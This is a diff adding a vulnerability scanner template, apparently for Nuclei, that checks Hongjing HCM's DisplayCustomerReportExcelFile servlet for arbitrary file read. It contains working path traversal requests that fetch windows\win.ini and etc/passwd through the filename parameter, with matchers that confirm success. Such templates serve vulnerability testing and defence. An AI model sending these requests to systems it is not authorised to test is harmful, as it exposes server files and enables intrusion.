@@ -1,0 +1,48 @@
+id: hjsoft-hcm-displaycustomerreportexcelfile-file-read
+
+info:
+  name: DisplayCustomerReportExcelFile File Read in Hongjing HCM
+  author: onewin
+  severity: high
+  description: |
+    Checks for an arbitrary file read vulnerability in Hongjing HCM.
+  reference:
+    - https://github.com/vaycore/HrmsTool/releases/tag/0.1
+  tags: HJSoft-HCM
+
+http:
+  - raw:
+      - |
+        GET /servlet/DisplayCustomerReportExcelFile?filename=..%5C..%5Cwindows%5Cwin.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+  - raw:
+      - |
+        GET /servlet/DisplayCustomerReportExcelFile?filename=..%5C..%5Cetc%5Cpasswd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
